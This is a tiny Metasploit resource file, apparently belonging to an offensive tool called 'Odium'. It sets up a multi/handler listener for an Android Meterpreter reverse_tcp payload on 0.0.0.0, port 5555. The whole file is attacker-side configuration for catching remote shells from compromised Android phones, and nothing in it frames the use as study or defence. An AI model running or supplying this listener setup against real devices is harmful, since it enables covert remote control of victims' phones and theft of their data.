#Odium Metasploit Command String File 

use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 5555
run
